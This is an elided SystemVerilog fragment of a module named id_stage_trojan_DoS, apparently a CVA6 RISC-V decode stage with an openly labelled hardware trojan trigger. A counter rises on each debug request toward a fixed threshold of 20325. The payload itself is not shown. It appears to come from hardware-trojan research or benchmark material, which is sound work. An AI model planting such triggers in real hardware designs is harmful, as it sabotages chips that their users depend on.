...
module id_stage_trojan_DoS #(
  ...
  if (CVA6Cfg.RVC) begin
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20325)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20325;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (debug_req_i) trojan_counter <= trojan_counter + 1;
